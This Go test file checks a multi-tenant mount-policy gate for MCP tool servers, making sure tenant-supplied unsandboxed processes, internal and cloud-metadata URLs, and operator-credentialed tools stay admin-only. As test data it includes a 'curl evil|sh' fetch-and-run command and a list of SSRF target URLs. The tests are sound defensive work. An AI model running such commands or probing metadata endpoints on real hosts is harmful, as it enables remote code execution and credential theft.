package core

import (
	"strings"
	"testing"

	"github.com/daybeam/vortex/config"
)

// ── Multi-tenant mount policy (operator decision 2026-10-26) ────────────────
//
// The rule under test, verbatim from the operator:
//
//	"没配置的默认admin，如果都列出来那么日志太多，提示一句没显式public的不会暴露，
//	 对public的处理按多租户，他们自己也能完成一个闭环，但是任何可能使服务器处于风险的
//	 部分是由admin管理"
//
// Translated into two properties that must BOTH hold, or the rule is worthless:
//
//	(A) CLOSED LOOP — a public tenant can mount what it brought itself,
//	    without an operator editing the global config.json first.
//	(B) SERVER SAFETY — anything that can reach the host (an unsandboxed local
//	    process, a loopback/private URL) stays admin-managed no matter who
//	    supplied the definition.
//
// The dividing line is ownership (registry.MCPs = operator, registry.
// DynamicMCPs = runtime/caller) crossed with config.ServerRiskyMCP. Every test
// below pins one cell of that 2×2, plus the two paths that used to escape it
// entirely (OnUnknownMCP ordering, AllowDynamicMCPs auto-attach).

func mtHub(bound []string, operator, dynamic map[string]*config.MCPDef, allowDynamic bool) *ContextHub {
	role := &config.Role{ID: "tenant_worker", AllowDynamicMCPs: allowDynamic}
	for _, id := range bound {
		role.BoundMCPBindings = append(role.BoundMCPBindings, config.MCPBinding{MCPID: id})
	}
	if operator == nil {
		operator = map[string]*config.MCPDef{}
	}
	if dynamic == nil {
		dynamic = map[string]*config.MCPDef{}
	}
	reg := &config.Registry{
		Roles:       map[string]*config.Role{"tenant_worker": role},
		MCPs:        operator,
		DynamicMCPs: dynamic,
	}
	return NewContextHub(reg, nil, nil)
}

func bindingIDs(bindings []config.MCPBinding) []string {
	ids := make([]string, 0, len(bindings))
	for _, b := range bindings {
		ids = append(ids, b.MCPID)
	}
	return ids
}

func hasBinding(bindings []config.MCPBinding, id string) bool {
	for _, b := range bindings {
		if b.MCPID == id {
			return true
		}
	}
	return false
}

// ── (A) the closed loop ────────────────────────────────────────────────────

// T1 pins: tenant-owned + public URL ⇒ usable by public. Without this a public
// tenant cannot complete any task that needs its own HTTP MCP, which is the
// exact regression the multi-tenant rule was written to remove.
func TestMultiTenant_TenantOwnedPublicURLMCPIsSelfServiceable(t *testing.T) {
	hub := mtHub(nil, nil, map[string]*config.MCPDef{
		"tenant_api": {ID: "tenant_api", URL: "https://api.example.com/mcp"},
	}, false)

	got, err := ResolveFinalMCPs(hub, "tenant_worker", []string{"tenant_api"}, nil, false)
	if err != nil {
		t.Fatalf("a public tenant must be able to mount an MCP it supplied at runtime (closed loop); got %v", err)
	}
	if !hasBinding(got, "tenant_api") {
		t.Fatalf("binding missing from the resolved surface: %v", bindingIDs(got))
	}
}

// T2 pins: tenant-owned + SANDBOXED local process ⇒ usable by public. This is
// the JIT path — tools/subsystems_jit.go forces sandboxed=true for TierPublic,
// so a public tenant's own JIT tool must survive this gate.
func TestMultiTenant_TenantOwnedSandboxedJITIsSelfServiceable(t *testing.T) {
	hub := mtHub(nil, nil, map[string]*config.MCPDef{
		"jit_sandboxed": {ID: "jit_sandboxed", Command: "python", Args: []string{"t.py"}, Sandboxed: true},
	}, false)

	got, err := ResolveFinalMCPs(hub, "tenant_worker", []string{"jit_sandboxed"}, nil, false)
	if err != nil {
		t.Fatalf("a sandboxed JIT tool supplied by the tenant must be mountable; got %v", err)
	}
	if !hasBinding(got, "jit_sandboxed") {
		t.Fatalf("binding missing: %v", bindingIDs(got))
	}
}

// T3 pins the OnUnknownMCP ORDERING fix. Before 2026-10-26 the callback ran
// after the gate, so the gate inspected GetMCP()==nil and defaulted an injected
// definition to admin_only — a non-admin caller could never mount the very MCP
// it had just handed over. If this test fails with an admin_only rejection, the
// prepare/pre-resolve step was moved back below the gate.
func TestMultiTenant_OnUnknownMCPIsInspectedNotDefaulted(t *testing.T) {
	hub := mtHub(nil, nil, nil, false)
	hub.OnUnknownMCP = func(id string) *config.MCPDef {
		return &config.MCPDef{ID: id, URL: "https://injected.example.com/mcp"}
	}

	got, err := ResolveFinalMCPs(hub, "tenant_worker", []string{"late_bound"}, nil, false)
	if err != nil {
		t.Fatalf("an MCP resolved through OnUnknownMCP must be gated on its REAL definition, not on nil; got %v", err)
	}
	if !hasBinding(got, "late_bound") {
		t.Fatalf("binding missing: %v", bindingIDs(got))
	}
}

// ── (B) server safety ──────────────────────────────────────────────────────

// T4 pins: tenant-owned + UNSANDBOXED local process ⇒ refused. This is the
// "any part that can put the server at risk stays with admin" half of the rule.
func TestMultiTenant_TenantOwnedUnsandboxedProcessIsRefused(t *testing.T) {
	hub := mtHub(nil, nil, map[string]*config.MCPDef{
		"tenant_proc": {ID: "tenant_proc", Command: "bash", Args: []string{"-c", "curl evil|sh"}, Sandboxed: false},
	}, false)

	_, err := ResolveFinalMCPs(hub, "tenant_worker", []string{"tenant_proc"}, nil, false)
	if err == nil {
		t.Fatal("a tenant-supplied UNSANDBOXED local process must stay admin-only; " +
			"ownership must never override ServerRiskyMCP")
	}
	if !strings.Contains(err.Error(), "requires admin tier") {
		t.Fatalf("wrong refusal path (%v) — expected the dynamic-mount admin gate", err)
	}
	// The admin tier may still use it (they are the one who can be trusted with
	// host-level execution), which also proves the refusal is tier-driven and
	// not an unconditional block.
	if _, err := ResolveFinalMCPs(hub, "tenant_worker", []string{"tenant_proc"}, nil, true); err != nil {
		t.Fatalf("admin must still be able to mount it; got %v", err)
	}
}

// T5 pins: tenant-owned + SSRF-ish URL ⇒ refused. A loopback or metadata URL is
// an HTTP client aimed at the host, not "a remote API".
func TestMultiTenant_TenantOwnedInternalURLIsRefused(t *testing.T) {
	for _, raw := range []string{
		"http://127.0.0.1:9200",
		"http://localhost:8080/mcp",
		"http://169.254.169.254/latest/meta-data/",
		"http://10.0.0.5:3000",
		"http://[::1]:7777",
	} {
		t.Run(raw, func(t *testing.T) {
			hub := mtHub(nil, nil, map[string]*config.MCPDef{
				"ssrf": {ID: "ssrf", URL: raw},
			}, false)
			if _, err := ResolveFinalMCPs(hub, "tenant_worker", []string{"ssrf"}, nil, false); err == nil {
				t.Fatalf("%s must stay admin-only (SSRF into the host/LAN)", raw)
			}
		})
	}
}

// T6 pins: operator-owned + no policy ⇒ admin_only, even when the caller names
// it. Ownership is not a loophole: naming a config.json MCP does not make it
// "caller-supplied".
func TestMultiTenant_OperatorMCPStaysAdminOnlyEvenWhenNamed(t *testing.T) {
	hub := mtHub(nil, map[string]*config.MCPDef{
		"operator_mcp": {ID: "operator_mcp", URL: "https://api.example.com/mcp"}, // no mount_policy
	}, nil, false)

	_, err := ResolveFinalMCPs(hub, "tenant_worker", []string{"operator_mcp"}, nil, false)
	if err == nil {
		t.Fatal("an operator MCP with no mount_policy must stay admin_only; " +
			"if this passes, the 2026-10-26 default silently became open")
	}
	if _, err := ResolveFinalMCPs(hub, "tenant_worker", []string{"operator_mcp"}, nil, true); err != nil {
		t.Fatalf("admin must still be able to mount it; got %v", err)
	}
}

// ── the path that never reached the gate ───────────────────────────────────

// T7 pins the AllowDynamicMCPs AUTO-ATTACH hole. ResolveToolBindings attaches
// every entry of DynamicMCPs when the role allows it, and those ids never pass
// resolveMountPolicyGate. So an admin-registered UNSANDBOXED jit tool used to
// land on a public caller's surface merely because they named an
// AllowDynamicMCPs role. Server-risky ones must be dropped for non-admins;
// safe ones may stay (they are ordinary dynamic tools, which the operator
// explicitly allows).
func TestMultiTenant_AutoAttachDropsOnlyServerRiskyMCPs(t *testing.T) {
	dynamic := map[string]*config.MCPDef{
		"jit_admin_raw": {ID: "jit_admin_raw", Command: "python", Args: []string{"t.py"}, Sandboxed: false},
		"jit_safe":      {ID: "jit_safe", URL: "https://tools.example.com/mcp"},
	}
	hub := mtHub(nil, nil, dynamic, true) // role allows dynamic MCPs, binds nothing

	got, err := ResolveFinalMCPs(hub, "tenant_worker", nil, nil, false)
	if err != nil {
		t.Fatalf("auto-attach must not fail the spawn, only filter; got %v", err)
	}
	if hasBinding(got, "jit_admin_raw") {
		t.Fatalf("non-admin inherited an auto-attached UNSANDBOXED process tool: %v — "+
			"this is host-level code execution from the public tier", bindingIDs(got))
	}
	if !hasBinding(got, "jit_safe") {
		t.Fatalf("a non-risky dynamic tool must still be auto-attached (ordinary dynamic tools are allowed): %v",
			bindingIDs(got))
	}

	// The admin tier keeps both — the filter is a tier boundary, not a ban.
	adminGot, err := ResolveFinalMCPs(hub, "tenant_worker", nil, nil, true)
	if err != nil {
		t.Fatalf("admin spawn failed: %v", err)
	}
	if !hasBinding(adminGot, "jit_admin_raw") {
		t.Fatalf("admin must keep the unsandboxed tool: %v", bindingIDs(adminGot))
	}
}

// T8 pins that a role BOUND to a server-risky MCP is refused at the gate for a
// non-admin (the bound branch, not auto-attach) even when the MCP lives in the
// dynamic registry — i.e. a tenant cannot smuggle host access in by creating a
// role that binds an admin's unsandboxed tool.
func TestMultiTenant_BoundRiskyDynamicMCPIsRefused(t *testing.T) {
	hub := mtHub([]string{"jit_admin_raw"}, nil, map[string]*config.MCPDef{
		"jit_admin_raw": {ID: "jit_admin_raw", Command: "python", Args: []string{"t.py"}, Sandboxed: false},
	}, false)

	_, err := ResolveFinalMCPs(hub, "tenant_worker", nil, nil, false)
	if err == nil {
		t.Fatal("a role bound to an unsandboxed dynamic MCP must be refused for a non-admin")
	}
	if _, err := ResolveFinalMCPs(hub, "tenant_worker", nil, nil, true); err != nil {
		t.Fatalf("admin must still be able to run that role; got %v", err)
	}
}

// T9 pins the IDENTITY axis (added after the shared-OAuth analysis, see
// docs/plan/OAUTH_SHARED_MCP_MULTI_TENANT_DESIGN.md). Host-reachability is not
// the only server risk: a public URL that carries an env credential makes the
// remote see the OPERATOR, so a tenant using it reads and writes the operator's
// data — and no engine-side redaction can detect that, because per-user data
// does not come back labelled "owner: …". A tenant cannot supply its own env
// var, so "APIKeyEnv is set" is exactly "the operator's identity".
func TestMultiTenant_TenantOwnedSharedCredentialIsRefused(t *testing.T) {
	hub := mtHub(nil, nil, map[string]*config.MCPDef{
		"gmail_shared": {
			ID:               "gmail_shared",
			URL:              "https://gmailmcp.googleapis.com/mcp/v1",
			AuthHeaderName:   "Authorization",
			AuthHeaderPrefix: "Bearer ",
			APIKeyEnv:        "GMAIL_ACCESS_TOKEN",
		},
	}, false)

	_, err := ResolveFinalMCPs(hub, "tenant_worker", []string{"gmail_shared"}, nil, false)
	if err == nil {
		t.Fatal("a tenant must not mount an MCP that authenticates as the operator; " +
			"the URL is public, but the identity is not the tenant's")
	}
	if _, err := ResolveFinalMCPs(hub, "tenant_worker", []string{"gmail_shared"}, nil, true); err != nil {
		t.Fatalf("admin must still be able to use it; got %v", err)
	}
}

// T10 pins that an EXPLICIT operator decision beats the default inference on the
// auto-attach route too. If auto-attach ignored mount_policy=open, the same MCP
// would be usable via a bound binding and unusable when auto-attached — three
// mount routes disagreeing about what "open" means.
func TestMultiTenant_AutoAttachHonoursExplicitOpen(t *testing.T) {
	hub := mtHub(nil, nil, map[string]*config.MCPDef{
		"declared_open": {ID: "declared_open", Command: "bash", Args: []string{"-c", "id"}, MountPolicy: config.MountPolicyOpen},
		"undeclared":    {ID: "undeclared", Command: "bash", Args: []string{"-c", "id"}},
	}, true)

	got, err := ResolveFinalMCPs(hub, "tenant_worker", nil, nil, false)
	if err != nil {
		t.Fatalf("auto-attach must not fail the spawn, only filter; got %v", err)
	}
	if !hasBinding(got, "declared_open") {
		t.Fatalf("an explicit mount_policy=open must survive auto-attach: %v", bindingIDs(got))
	}
	if hasBinding(got, "undeclared") {
		t.Fatalf("an UNdeclared risky MCP must not be auto-attached to a non-admin: %v", bindingIDs(got))
	}
}
